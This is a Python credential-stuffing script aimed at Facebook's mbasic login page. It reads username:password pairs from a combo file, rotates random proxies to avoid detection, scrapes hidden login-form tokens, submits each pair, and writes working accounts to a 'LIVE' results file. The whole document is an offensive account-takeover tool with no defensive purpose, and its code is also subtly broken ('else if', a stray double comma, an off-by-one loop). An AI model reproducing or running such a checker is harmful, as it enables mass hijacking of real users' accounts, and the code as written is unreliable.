import requests as rq
import re
import random as rand
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Pragma"    : "no-cache",
    "Accept"    : "*/*",
    "Origin"    : "https://mbasic.facebook.com",
    "Referer"   : "https://mbasic.facebook.com/"
    }
_input = open("input.txt","r").readlines()
proxies = open("proxies.txt","r").readlines()
rand.shuffle(proxies)
print(len(list(_input)))
def start(USER,PASS):
    proxy = rand.choice(proxies)
    ###----CookieJar----####
    cookieJar = rq.cookies.RequestsCookieJar()
    ###----FirstRequest----###
    Rq_Get_1 = rq.get("https://mbasic.facebook.com/",proxies={"http":"http://"+proxy,"https":"https://"+proxy})
    ###----Stuff----###
    m_ts = Rq_Get_1.text[re.search('name="m_ts" value="',Rq_Get_1.text).end():re.search('" /><input type="hidden" name="li"',Rq_Get_1.text).start()]
    li = Rq_Get_1.text[re.search('name="li" value="',Rq_Get_1.text).end():re.search('" /><input type="hidden" name="try_number"',Rq_Get_1.text).start()]
    jazoest = Rq_Get_1.text[re.search('name="jazoest" value="',Rq_Get_1.text).end():re.search('" autocomplete="off" /><input type="hidden" name="m_ts',Rq_Get_1.text).start()]
    lsd = Rq_Get_1.text[re.search('name="lsd" value="',Rq_Get_1.text).end():re.search('" autocomplete="off" /><input type="hidden" name="jazoest"',Rq_Get_1.text).start()]
    ###----UpdateJar----###
    cookieJar.update(Rq_Get_1.cookies)
    print(cookieJar)
    ###----PostRq----###
    Rq_Post_0 = rq.session()
    Rq_Post_0.headers.update(headers)
    Rq_Post_0.cookies = cookieJar
    Data = {
            "lsd":lsd,
            "jazoest":jazoest,
            "m_ts":m_ts,
            "li":li,
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":USER,
            "pass":PASS,
            "login":"Log+In"
            }
    Rq_Post_0_send = Rq_Post_0.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=Data,,proxies={"http":"http://"+proxy,"https":"https://"+proxy})
    #with open("result.html","w") as result:
     #   result.write(Rq_Post_0_send.text)
    if "هل نسيت كلمة السر؟" in Rq_Post_0_send.text or "Forgotten password?" in Rq_Post_0_send.text :
        print(USER+":"+PASS+"[DEAD]")
        with open("resultDEAD.text","a") as resultDEAD:
            resultDEAD.write(USER+":"+PASS)
    else if "https://mbasic.facebook.com/login/save-device" in Rq_Post_0_send.url or "بحث عن أصدقاء" in Rq_Post_0_send.text or "Find Friends" in Rq_Post_0_send.text :
        print(USER+":"+PASS+"[LIVE]")
        with open("resultsLIVE.text","a") as resultLIVE:
            resultLIVE.write(USER+":"+PASS)
    else :
        with open("resultsUNKOWN.text","a") as resultsUNKOWN:
            resultsUNKOWN.write(USER+":"+PASS)
i = 0
while i <= len(list(_input)) :
    USER, PASS = _input[i].split(":")
    start(USER,PASS)
    i += 1
    if i == len(list(_input)):
        print("finished")
        break

